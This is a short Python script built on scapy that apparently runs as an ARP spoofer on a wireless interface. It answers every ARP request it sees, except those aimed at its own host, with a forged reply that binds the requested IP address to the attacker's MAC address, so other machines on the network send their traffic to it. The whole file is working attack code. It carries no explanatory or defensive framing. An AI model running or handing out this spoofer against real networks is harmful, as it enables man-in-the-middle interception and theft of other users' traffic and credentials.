from threading import Thread
from scapy.all import *

INTERFACE = "wlan0"
MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
MY_IP_ADDRESS = get_if_addr(INTERFACE)

class ARPSpoofer(AnsweringMachine):
    def is_request(self, request):
        return request.haslayer('ARP') and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
    
    def make_reply(self, request):
        response = Ether()/ARP()
        response[Ether].dst = request[Ether].src
        response[Ether].src = MY_MAC_ADDRESS
        response[ARP].op = 2
        response[ARP].hwsrc = MY_MAC_ADDRESS
        response[ARP].hwdst = request[ARP].hwsrc
        response[ARP].psrc = request[ARP].pdst
        response[ARP].pdst = request[ARP].psrc
        return response[ARP]

arp_spoofer = Thread(target=ARPSpoofer())
arp_spoofer.start()
arp_spoofer.join()